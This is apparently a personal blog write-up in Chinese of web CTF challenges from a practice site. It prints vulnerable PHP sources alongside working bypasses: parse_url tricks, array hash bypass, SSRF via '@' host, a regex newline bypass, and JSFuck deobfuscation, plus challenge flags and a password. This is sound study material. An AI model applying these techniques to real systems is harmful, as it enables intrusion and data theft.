<p>emmmmm最后直接访问/或者加上index.php抓包。。。302直接一大个flag。。日了喵了（curl也直接可以看到x</p>
<h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><p>If you want to have a flag, please answer from the URL.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</div><div class="line">    $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</div><div class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</div><div class="line">    $params = explode(<span class="string">"&amp;"</span>, $url_query);</div><div class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</div><div class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);</div><div class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</div><div class="line">            $key = $param;</div><div class="line">            $value = <span class="string">""</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);</div><div class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>一直在本地各种试。。然后老年人记性终于想起那个parse_url()的漏洞结果忘了这是只存在于php5.4.7以前</p>
<p>最后加两个斜杠出flag</p>
<p>qaqqqqqqqqqqqqqqqq</p>
<p>结果wp是另一种骚操作。。orzzzzzzz</p>
<p><code>?foo%23&amp;do_you_want_flag=yes</code> 结果是foo-&gt;空，后面应该是注释掉惹，$url_query只剩下foo，但的确get到了do_you_want_flag，妙吖.jpg</p>
<h3 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h3><p>We had better be prepared for collisions, because two distinct keys will occasionally hash to the same value.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>数组绕过。一秒粗flag。那句话怎么说来着、、随着身体一阵颤抖突然觉得索然无味？（什么鬼x</p>
<h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    $value = $_GET[&apos;value&apos;];</div><div class="line"></div><div class="line">    $username = $_GET[&apos;username&apos;];</div><div class="line">    $password = $_GET[&apos;password&apos;];</div><div class="line"></div><div class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</div><div class="line">        if ($_GET[&apos;username&apos;]) unset($username);</div><div class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</div><div class="line">        else $username .= chr($value[$i]);</div><div class="line"></div><div class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</div><div class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</div><div class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>./secret.passwd得到password=simple_passw0rd</p>
<p>然后直接传username会被unset，value要是在32-127的可见字符中也要unset</p>
<p>看PHP手册里的chr(),第一个栗子就嗦</p>
<p>Note that if the number is higher than 256, it will return the number mod 256.<br>For example :<br>chr(321)=A because A=65(256)</p>
<p>然后就很容易啦，每个加256~</p>
<p>另外那种加好多小数点加上几e几的也可以~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://array2string.solveme.peng.kr/?value[0]=305&amp;value[1]=309&amp;value[2]=372&amp;value[3]=360&amp;value[4]=351&amp;value[5]=328&amp;value[6]=353&amp;value[7]=355&amp;value[8]=363&amp;value[9]=361&amp;value[10]=366&amp;value[11]=359&amp;value[12]=323&amp;value[13]=353&amp;value[14]=365&amp;value[15]=368&amp;password=simple_passw0rd</div></pre></td></tr></table></figure>
<p>好像数组只能这样一个一个传？恩x</p>
<h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><p>I want link of local server.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</div><div class="line">        $url = $_GET[&apos;url&apos;];</div><div class="line"></div><div class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</div><div class="line">            die(&apos;Not allowed character&apos;);     //url里不能有下划线</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if(!preg_match(&apos;/^https?\:\/\/&apos;.$_SERVER[&apos;HTTP_HOST&apos;].&apos;/i&apos;, $url))&#123;</div><div class="line">            die(&apos;Not allowed URL&apos;);           //url要匹配Host:http://givemealink.solveme.peng.kr</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $parse = parse_url($url);             //parse_url解析 URL，返回其组成部分</div><div class="line">        if($parse[&apos;path&apos;] !== &apos;/plz_give_me&apos;)&#123;</div><div class="line">            die(&apos;Not allowed path&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $ch = curl_init();                    //向解析出的$parse[&apos;host&apos;]地址curl发送flag</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $parse[&apos;scheme&apos;].&apos;://&apos;.$parse[&apos;host&apos;].&apos;/&apos;.$flag);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</div><div class="line">        curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line"></div><div class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>补一发请求头里的host，明明上次看视频刚刚记过。。又忘了QAQ</p>
<ul>
<li>多个域名放在同一台主机上时，通过不同的Host可以区分出我是访问这个虚拟机上的哪个站点</li>
</ul>
<p>Example #1 parse_url() 栗子：</p>
<p><code>&lt;?php$url = &#39;http://username:password@hostname/path?arg=value#anchor&#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;</code></p>
<p>以上例程会输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Array</div><div class="line">(</div><div class="line">    [scheme] =&gt; http</div><div class="line">    [host] =&gt; hostname</div><div class="line">    [user] =&gt; username</div><div class="line">    [pass] =&gt; password</div><div class="line">    [path] =&gt; /path</div><div class="line">    [query] =&gt; arg=value</div><div class="line">    [fragment] =&gt; anchor</div><div class="line">)</div></pre></td></tr></table></figure>
<p>所以把我们哒host放@后面就好啦</p>
<p>po个图嘿嘿嘿<img src="https://s1.ax1x.com/2018/03/27/9OzPQ1.png" alt="9OzPQ1.png"></p>
<p>这儿有个问题，窝第一下带了个端口然后监听那个端口是get不到的，想了想应该是它的get请求就得用80端口才能收到（大概x</p>
<p>哦哦下划线的过滤用%10啊%1a啊这种linux认不得的字符它就会寄几转成下划线啦~</p>
<p>（更正：不是linux转的。。又是这个parse<em>url()的漏洞:The URL to parse. Invalid characters are replaced by \</em>.</p>
<p>（补充：第一下窝也是想看log来着。。不叽到在哪啊。。（丢人x。。所以就监听着惹。。（捂脸x</p>
<p>所以似/var/log/目录下面，用<code>grep flag *</code>进行查找</p>
<h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><p>I want link of local server.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</div><div class="line">        $url = $_GET[&apos;url&apos;];</div><div class="line"></div><div class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</div><div class="line">            die(&apos;Not allowed character&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $parse = parse_url($url);</div><div class="line">        if(!preg_match(&apos;/^https?$/i&apos;, $parse[&apos;scheme&apos;]))&#123;</div><div class="line">            die(&apos;Not allowed scheme&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</div><div class="line">            die(&apos;Not allowed host&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if(!preg_match(&apos;/\/plz_give_me$/&apos;, $parse[&apos;path&apos;]))&#123;</div><div class="line">            die(&apos;Not allowed path&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</div><div class="line">        if($socket === false)&#123;</div><div class="line">            die(&apos;Failed to create socket&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $host = gethostbyname($parse[&apos;host&apos;]);</div><div class="line">        $port = is_null($parse[&apos;port&apos;]) ? 80 : $parse[&apos;port&apos;];</div><div class="line"></div><div class="line">        if(socket_connect($socket, $host, $port) === false)&#123;</div><div class="line">            die(&apos;Failed to connect&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $send = &quot;HEAD /&quot;.$flag.&quot; HTTP/1.1\r\n&quot;.</div><div class="line">            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</div><div class="line">            &quot;Connection: Close\r\n&quot;.</div><div class="line">            &quot;\r\n\r\n&quot;;</div><div class="line">        socket_write($socket, $send, strlen($send));</div><div class="line"></div><div class="line">        $recv = socket_read($socket, 1024);var_dump($recv);</div><div class="line">        if(!preg_match(&apos;/^HTTP\/1.1 200 OK\r\n/&apos;, $recv))&#123;</div><div class="line">            die(&apos;Not allowed response&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        socket_close($socket);</div><div class="line"></div><div class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>加了个匹配</p>
<p><code>preg_match(&#39;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&#39;, $parse[&#39;host&#39;])</code></p>
<p>注意到中间有个或任何数字，所以把IP转成大整数就和上题一样啦</p>
<p>有网站在线转也有PHP的一个函数ip2long()</p>
<h3 id="Replacefilter"><a href="#Replacefilter" class="headerlink" title="Replacefilter"></a>Replacefilter</h3><p>Do not tell me to give the flag.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    if(isset($_GET[&apos;say&apos;]) &amp;&amp; strlen($_GET[&apos;say&apos;]) &lt; 20)&#123;</div><div class="line"></div><div class="line">        $say = preg_replace(&apos;/^(.*)flag(.*)$/&apos;, &apos;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&apos;, $_GET[&apos;say&apos;]);</div><div class="line"></div><div class="line">        if(preg_match(&apos;/give_me_the_flag/&apos;, $say))&#123;</div><div class="line">            echo $flag;</div><div class="line">        &#125;else&#123;</div><div class="line">            echo &apos;What the f**k?&apos;;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        echo &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>看到preg_replace第一反应双写绕过。。然鹅刚好长度20。。</p>
<p>用%0a换行符绕过匹配（^ $必须在同一行的匹配~</p>
<h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>I created art with javascript.</p>
<p>WTF…不管在哪个网站解。。都是弹窗。。喵喵喵？</p>
<p>然后继续撒夫夫地搜”jsfuck在线解“居然第三个答案就是这题wp！惊了！一直以为这个网站米有wp存在的。。。</p>
<p>然后学到两个姿势</p>
<p>1.<code>eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()  //翻译格式</code></p>
<p>2.sublime里Ctrl+Shift+Space就可以选中所在的括号及对应括号间的区域~</p>
<p>然后选到第二段炒鸡长的放控制台就有啦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">// good job!</div><div class="line"></div><div class="line">let flag = prompt(&quot;what is the flag?&quot;);</div><div class="line"></div><div class="line">if (flag === &quot;&quot;) &#123;</div><div class="line"></div><div class="line">	alert(&quot;plz input&quot;);</div><div class="line"></div><div class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</div><div class="line"></div><div class="line">	alert(&quot;bingo&quot;);</div><div class="line"></div><div class="line">&#125; else &#123;</div><div class="line"></div><div class="line">	alert(&quot;wrong&quot;);</div><div class="line"></div><div class="line">&#125;&quot;</div></pre></td></tr></table></figure>
<p>（补充：卧槽。。方方土学长的另一种骚操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># coding: utf-8</div><div class="line"></div><div class="line">js = &quot;......&quot; #此处省去源码</div><div class="line"></div><div class="line">alpha_dict = &#123;</div><div class="line">	&apos;&quot;f&quot;&apos;: &apos;(![]+[])[+[]]&apos;,</div><div class="line">	&apos;&quot;i&quot;&apos;: &apos;([][[]]+[])[!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;l&quot;&apos;: &apos;(![]+[])[!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;t&quot;&apos;: &apos;(!![]+[])[+[]]&apos;,</div><div class="line">	&apos;&quot;e&quot;&apos;: &apos;(!![]+[])[!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;r&quot;&apos;: &apos;(!![]+[])[+!![]]&apos;,</div><div class="line">	&apos;&quot;c&quot;&apos;: &apos;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;o&quot;&apos;: &apos;(&#123;&#125;+[])[+!![]]&apos;,</div><div class="line">	&apos;&quot;n&quot;&apos;: &apos;([][[]]+[])[+!![]]&apos;,</div><div class="line">	&apos;&quot;s&quot;&apos;: &apos;(![]+[])[!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;u&quot;&apos;: &apos;(!![]+[])[!![]+!![]]&apos;,</div><div class="line">	&apos;&quot; &quot;&apos;: &apos;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;b&quot;&apos;: &apos;(&#123;&#125;+[])[!![]+!![]]&apos;,</div><div class="line">	&apos;&quot; &quot;&apos;: &apos;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;a&quot;&apos;: &apos;(![]+[])[+!![]]&apos;,</div><div class="line">	&apos;&quot;2&quot;&apos;: &apos;(!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;4&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;7&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;y&quot;&apos;: &apos;(+(+!![]+&quot;e&quot;+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;0&quot;&apos;: &apos;(+[]+[])&apos;,</div><div class="line">	&apos;&quot;3&quot;&apos;: &apos;(!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;5&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;1&quot;&apos;: &apos;(+!![]+[])&apos;,</div><div class="line">	&apos;&quot;9&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;8&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;6&quot;&apos;: &apos;(!![]+!![]+!![]+!![]+!![]+!![]+[])&apos;,</div><div class="line">	&apos;&quot;y&quot;&apos;: &apos;(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&apos;,</div><div class="line">	&apos;&quot;d&quot;&apos;: &apos;([][[]]+[])[!![]+!![]]&apos;,</div><div class="line">	&apos;[3]&apos;: &apos;[!![]+!![]+!![]]&apos;</div><div class="line">&#125;</div><div class="line"></div><div class="line">for key, value in alpha_dict.items():</div><div class="line">	js = js.replace(value, key)</div><div class="line"></div><div class="line">clean_dict = &#123;</div><div class="line">	&apos;&quot;p&quot;&apos;: &apos;([][&quot;filter&quot;][&quot;constructor&quot;](&quot;return &quot;+&quot;location&quot;)()+[])[3]&apos;,</div><div class="line">	&apos;&quot;constructor&quot;&apos;: &apos;&quot;c&quot;+&quot;o&quot;+&quot;n&quot;+&quot;s&quot;+&quot;t&quot;+&quot;r&quot;+&quot;u&quot;+&quot;c&quot;+&quot;t&quot;+&quot;o&quot;+&quot;r&quot;&apos;,</div><div class="line">	&apos;&quot;return &quot;&apos;: &apos;&quot;r&quot;+&quot;e&quot;+&quot;t&quot;+&quot;u&quot;+&quot;r&quot;+&quot;n&quot;+&quot; &quot;&apos;,</div><div class="line">	&apos;&quot;filter&quot;&apos;: &apos;&quot;f&quot;+&quot;i&quot;+&quot;l&quot;+&quot;t&quot;+&quot;e&quot;+&quot;r&quot;&apos;,</div><div class="line">	&apos;&quot;fontcolor&quot;&apos;: &apos;&quot;f&quot;+&quot;o&quot;+&quot;n&quot;+&quot;t&quot;+&quot;c&quot;+&quot;o&quot;+&quot;l&quot;+&quot;o&quot;+&quot;r&quot;&apos;,</div><div class="line">	&apos;&quot;location&quot;&apos;: &apos;&quot;l&quot;+&quot;o&quot;+&quot;c&quot;+&quot;a&quot;+&quot;t&quot;+&quot;i&quot;+&quot;o&quot;+&quot;n&quot;&apos;,</div><div class="line">	&apos;&quot;110&quot;&apos;: &apos;&quot;1&quot;+&quot;2&quot;+&quot;2&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;5&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;&apos;,</div><div class="line">	&apos;&quot;111&quot;&apos;: &apos;&quot;1&quot;+&quot;1&quot;+&quot;1&quot;&apos;,</div><div class="line">	&apos;&quot;99&quot;&apos;: &apos;&quot;9&quot;+&quot;9&quot;&apos;,</div><div class="line">	&apos;&quot;98&quot;&apos;: &apos;&quot;9&quot;+&quot;8&quot;&apos;,</div><div class="line">	&apos;&quot;57&quot;&apos;: &apos;&quot;5&quot;+&quot;7&quot;&apos;,</div><div class="line">	&apos;&quot;101&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;1&quot;&apos;,</div><div class="line">	&apos;&quot;108&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;8&quot;&apos;,</div><div class="line">	&apos;&quot;106&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;6&quot;&apos;,</div><div class="line">	&apos;&quot;61&quot;&apos;: &apos;&quot;6&quot;+&quot;1&quot;&apos;,</div><div class="line">	&apos;&quot;112&quot;&apos;: &apos;&quot;1&quot;+&quot;1&quot;+&quot;2&quot;&apos;,</div><div class="line">	&apos;&quot;116&quot;&apos;: &apos;&quot;1&quot;+&quot;1&quot;+&quot;6&quot;&apos;,</div><div class="line">	&apos;&quot;40&quot;&apos;: &apos;&quot;4&quot;+&quot;0&quot;&apos;,</div><div class="line">	&apos;&quot;34&quot;&apos;: &apos;&quot;3&quot;+&quot;4&quot;&apos;,</div><div class="line">	&apos;&quot;119&quot;&apos;: &apos;&quot;1&quot;+&quot;1&quot;+&quot;9&quot;&apos;,</div><div class="line">	&apos;&quot;105&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;5&quot;&apos;,</div><div class="line">	&apos;&quot;102&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;2&quot;&apos;,</div><div class="line">	&apos;&quot;125&quot;&apos;: &apos;&quot;1&quot;+&quot;2&quot;+&quot;5&quot;&apos;,</div><div class="line">	&apos;&quot;102&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;2&quot;&apos;,</div><div class="line">	&apos;&quot;97&quot;&apos;: &apos;&quot;9&quot;+&quot;7&quot;&apos;,</div><div class="line">	&apos;&quot;100&quot;&apos;: &apos;&quot;1&quot;+&quot;0&quot;+&quot;0&quot;&apos;,</div><div class="line"># 	# &apos;&quot;u&quot;&apos;: &apos;(&quot;1&quot;[&quot;s&quot;+&quot;u&quot;+&quot;b&quot;]())[!![]+!![]]&apos;</div><div class="line">&#125;</div><div class="line"></div><div class="line">for key, value in clean_dict.items():</div><div class="line">	js = js.replace(value, key)</div><div class="line"></div><div class="line">print js</div></pre></td></tr></table></figure>
<p>然后有好多数字字符加来加去。。整理后再用String.fromCharCode()转成字符就是解粗来那个惹orzzzzzzzzzz不愧是方方土</p>
<p>然后那个网站里大佬的wp全是嘲讽。。</p>
<blockquote>
<p>just open another webpage in chrome, and open the development tool , choose the source tab, active the pause button, execute the jsfuck<br>encoded code, and step into next function call, then you can find the compare code , and the flag…that’s easy, maybe it should be 160pt instead of 260pt…</p>
</blockquote>
<p>哦。666666666666。扣唉扣。</p>
<h3 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h3><p>I really hate SQL injection.</p>
